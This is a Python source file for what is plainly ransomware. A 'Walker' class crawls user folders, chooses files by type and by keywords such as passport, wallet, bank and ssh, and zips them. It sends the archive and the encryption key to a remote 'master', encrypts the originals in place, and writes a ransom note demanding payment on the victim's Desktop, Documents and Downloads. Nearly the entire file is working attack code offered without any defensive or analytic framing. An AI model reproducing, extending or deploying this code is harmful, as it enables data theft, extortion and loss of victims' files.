import io
import os
import time
import zipfile
from cryptography.fernet import Fernet
from tools.files import FileHandler


class Walker:
    """
    A class to walk through a directory, encrypt/decrypt sensitive files, and optionally save them in a ZIP archive.
    """

    def __init__(self):
        self.file_handler = FileHandler()
        self.file_types = ['txt', 'csv', 'xml', 'json', 'yaml', 'ini', 'xls', 'xlsx', 'doc', 'docx', 'pdf', 'ppt',
                           'pptx', 'zip', 'tar', 'gz', '7z', 'rar', 'sqlite', 'db', 'jpg', 'jpeg', 'png', 'gif',
                           'bmp', 'tiff', 'psd', 'eps', 'svg', 'mp3', 'wav', 'flac', 'aac', 'mp4', 'avi', 'mov',
                           'mkv', 'wmv', 'flv', 'mpg', 'mpeg', 'webm', 'ogg', 'html', 'htm', 'php', 'asp']
        self.excluded_directories = ['.', "Windows", "Program Files", "Program Files (x86)", 'Adobe', 'Steam', 'Epic',
                                     '.cache', 'Epic Games', 'Docker', "ProgramData", "$Recycle.Bin",
                                     "System Volume Information", "AppData", "Temp", "Documents and Settings",
                                     "Recovery", "MSOCache", "Intel", "NVIDIA", "AMD", "Git", "Common Files",
                                     "All Users", "Default", "Default User", "boot", "EFI", "EFI System", "EFI Boot",
                                     "System", "Android", "Microsoft", "tmpfs", "var", "usr", "sbin", "proc", "bin",
                                     "dev", "etc", "home", "lib", "opt", "root", "run", "srv", "sys", "tmp", 'venv',
                                     'Games', 'Public', 'Templates', 'Programs', 'Start Menu', 'Recent', 'SendTo',
                                     'Local Settings', 'Local', 'Roaming', 'IntelGraphicsProfiles', 'NV_Cache',
                                     'NVIDIA Corporation', 'NvStreamSrv', 'NvTelemetry', 'NvBackend',
                                     'NVIDIA Corporation\\Installer2', 'NVIDIA Corporation\\NV_Cache', 'Windows.old',
                                     'Windows10Upgrade', 'PerfLogs', 'Microsoft.NET', 'WindowsApps',
                                     'Application Data', 'WindowsServiceProfiles', 'System32', 'SysWOW64', 'Installer',
                                     'C:\\$WINDOWS.~BT', 'C:\\$Windows.~WS', 'C:\\$Recycle.Bin', 'C:\\$GetCurrent',
                                     'Config.Msi', 'node_modules']
        self.sensitive_filenames = ["resume", "tax", "return", "bank", "statement", "passport", "config", "settings",
                                    "database", "backup", "wallet", "keystore", "id", "rsa", "pub", "my", "key",
                                    "passwords", "kdbx", "encryption", "certificate", "private", "notes", "script",
                                    "restore", "nginx", "apache", "recovery", "codes", "project", "email", "important",
                                    "document", "confidential", "report", "financial", "plan", "medical", "records",
                                    "crypto", "bitcoin", "ethereum", "secret", "auth", "vpn", "credit", "forms",
                                    "2023", "scan", "login", "encrypted", "files", "server", "ssh", "business",
                                    "research", "data", "contracts", "photos", "diary", "legal", "account", "source",
                                    "design", "emails", "test", "results", "social", "api", "projects"]
        self.names_to_avoid = ["temp", "cache", "tmp", "desktop.ini"]

    def is_sensitive_file(self, file_path):
        """
        Check if a file is sensitive based on its extension or name.

        Args:
            file_path (str): The path to the file.

        Returns:
            bool: True if the file is sensitive, False otherwise.
        """
        file_name = os.path.basename(file_path)
        file_extension = file_name.split('.')[-1].lower()
        return (file_extension in self.file_types or
                file_name in self.sensitive_filenames) and file_name not in self.names_to_avoid

    @staticmethod
    def create_urgent_file():
        """
        Create an urgent message file.

        This method creates a file with an urgent message on the user's desktop, documents, and downloads folders.
        """
        file_name = "READ_ME_IT_IS_URGENT.txt"
        file_content = "Some of your most valuable files were encrypted. You can't do anything about it. \n" \
                       "Send me an email at: xxx@xxx.com so we can discuss prices. \n" \
                       "\n" \
                       "Ps: I know the contents of the files already."

        # Get the path to the desktop, documents, and downloads folders
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        documents_path = os.path.join(os.path.expanduser("~"), "Documents")
        downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")

        # Create the full file path in each directory
        file_paths = [
            os.path.join(downloads_path, file_name),
            os.path.join(documents_path, file_name),
            os.path.join(desktop_path, file_name),
        ]

        # Write the file content in each directory
        for file_path in file_paths:
            try:
                with open(file_path, "w") as f:
                    f.write(file_content)
                print(f"File created: {file_path}")
            except IOError as e:
                print(f"Error creating file: {e}")

    @staticmethod
    def generate_encryption_key_bytes(content):
        """
        Generate an encryption key file with the provided content.

        Args:
            content (str): The content to be written in the encryption key file.

        Returns:
            tuple: A tuple containing the file name and file content as bytes.
        """
        file_content = content.encode('utf-8')

        # Get the current timestamp
        current_time = time.localtime()
        timestamp = time.strftime("%d-%m-%y_%H-%M", current_time)

        return f"encryption_key_{timestamp}.txt", file_content

    def walk(self, directory_path, password, agent, address, encrypt=False, decrypt=False, save_files=False):
        """
        Walk through a directory, encrypt sensitive files, and optionally save them in a ZIP archive.

        Args:
            directory_path (str): The path of the directory to be traversed.
            password (str): The password for decrypting files.
            agent: An agent object used for communication.
            address: The address to send files to.
            encrypt (bool): Whether to perform encryption.
            decrypt (bool): Whether to perform decryption.
            save_files (bool): Whether to save files in a ZIP archive.
        """
        if encrypt:
            key = Fernet.generate_key()
        else:
            key = ""

        files_successfully_encrypted = 0
        files_encryption_errors = 0

        if save_files:

            in_memory_zip = io.BytesIO()

            with zipfile.ZipFile(in_memory_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(directory_path):
                    if "$" in root or any(excl_dir in root for excl_dir in self.excluded_directories):
                        continue

                    print(f"Entering folder: {root}")

                    for filename in files:
                        filepath = os.path.join(root, filename)
                        script_name = os.path.basename(__file__).replace('.py', '.exe')

                        if script_name not in filepath and self.is_sensitive_file(filepath):

                            print("-----------------------------------------------------")

                            try:
                                file_size = os.path.getsize(filepath)

                                if file_size > 50000000:
                                    continue

                                relative_path = os.path.relpath(filepath, directory_path)

                                with open(filepath, 'rb') as file:
                                    file_bytes = file.read()

                                zipf.writestr(relative_path, file_bytes)

                                print(f"Added {filepath} to ZIP")

                                if encrypt:
                                    print(f"File {filepath} will be encrypted now.")
                                    self.file_handler.encrypt_file(filepath, key)
                                    files_successfully_encrypted += 1
                                    print("-----------------------------------------------------")

                            except Exception as e:
                                files_encryption_errors += 1
                                print(f"Couldn't zip {filepath}, why: {e}")
                                print("-----------------------------------------------------")

                        if decrypt and filepath.endswith('.fkd'):
                            print(f"Decrypting file {filepath}")
                            self.file_handler.decrypt_file(filepath, password)
                            print("-----------------------------------------------------")

                if encrypt:
                    encrypt_done_file_text = f"({address.getpeername()[0]}) encryption Key is: {key.decode()}"
                    encrypt_file_name, encrypt_file_content = self.generate_encryption_key_bytes(encrypt_done_file_text)
                    zipf.writestr(encrypt_file_name, encrypt_file_content)

            print("Encryption/Zipping of files done successfully")
            print(
                f"Files successfully encrypted: "
                f"{files_successfully_encrypted - files_encryption_errors}/{files_successfully_encrypted}")
            print(f"Files with encryption errors: {files_encryption_errors}")

            zip_bytes = in_memory_zip.getvalue()

            current_time = time.localtime()
            timestamp = time.strftime("%d-%m-%y_%H-%M", current_time)

            try:
                agent.send_file_to_master(address, f'personal_files_{timestamp}.zip', zip_bytes)

            except Exception as e:
                print("Error occurred during sending the zip file:", e)

            finally:
                in_memory_zip.close()

            if encrypt:
                self.create_urgent_file()

        else:

            for root, dirs, files in os.walk(directory_path):
                if "$" in root or any(excl_dir in root for excl_dir in self.excluded_directories):
                    continue

                print(f"Entering folder: {root}")

                for filename in files:
                    filepath = os.path.join(root, filename)
                    script_name = os.path.basename(__file__).replace('.py', '.exe')

                    if decrypt:
                        if filepath.endswith('.fkd'):
                            print("-----------------------------------------------------")

                            print(f"Decrypting file {filepath}")

                            self.file_handler.decrypt_file(filepath, password)

                            print("-----------------------------------------------------")

                    else:
                        if script_name not in filepath and self.is_sensitive_file(filepath):
                            try:
                                file_size = os.path.getsize(filepath)

                                if file_size > 50000000:
                                    continue

                                if encrypt:
                                    print("-----------------------------------------------------")

                                    print(f"File {filepath} will be encrypted now.")
                                    self.file_handler.encrypt_file(filepath, key)

                                    files_successfully_encrypted += 1

                            except Exception as e:
                                files_encryption_errors += 1
                                print(f"Couldn't encrypt {filepath}, why: {e}")

                            print("-----------------------------------------------------")

            if decrypt:
                print('Decryption of files done successfully')
                agent.send_file_to_master(address, "encrypt_done", "None")

            if encrypt:
                print("Encryption of files done successfully")
                print(
                    f"Files successfully encrypted: "
                    f"{files_successfully_encrypted - files_encryption_errors}/{files_successfully_encrypted}")
                print(f"Files with encryption errors: {files_encryption_errors}")

                encrypt_done_file_text = f"({address.getpeername()[0]}) encryption Key is: {key.decode()}"
                encrypt_file_name, encrypt_file_content = self.generate_encryption_key_bytes(encrypt_done_file_text)
                agent.send_file_to_master(address, encrypt_file_name, encrypt_file_content)
                self.create_urgent_file()

        print("Done analyzing folders")
